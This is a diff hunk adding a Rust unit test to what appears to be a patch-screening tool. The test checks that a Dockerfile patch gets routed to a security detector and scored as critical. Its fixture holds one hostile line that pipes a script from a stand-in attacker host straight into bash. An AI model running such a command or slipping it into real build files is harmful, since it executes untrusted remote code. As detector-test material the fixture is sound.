@@ -2004,6 +2004,33 @@ index 1111111..2222222 100644
         );
     }
 
+    #[test]
+    fn dockerfile_surface_router_intercepts_extensionless_patch() {
+        let patch = "diff --git a/Dockerfile b/Dockerfile\n\
+                     index 0000000..1111111 100644\n\
+                     --- a/Dockerfile\n\
+                     +++ b/Dockerfile\n\
+                     @@ -0,0 +1,2 @@\n\
+                     +FROM alpine:3.20\n\
+                     +RUN curl -fsSL https://evil.example/install.sh | bash\n";
+
+        let score = forge::slop_filter::PatchBouncer::default()
+            .bounce(patch, &common::registry::SymbolRegistry::default())
+            .unwrap();
+
+        assert!(
+            score
+                .antipattern_details
+                .iter()
+                .any(|d| d.contains("security:dockerfile_pipe_execution")),
+            "Crucible: SurfaceKind routing must dispatch Dockerfile patches to the detector engine"
+        );
+        assert!(
+            score.score() >= 50,
+            "Crucible: extensionless Dockerfile routing must preserve critical scoring"
+        );
+    }
+
     // ---------------------------------------------------------------------------
     // Wasm host-guest round-trip — proves BYOP sandbox is functional end-to-end
     // ---------------------------------------------------------------------------
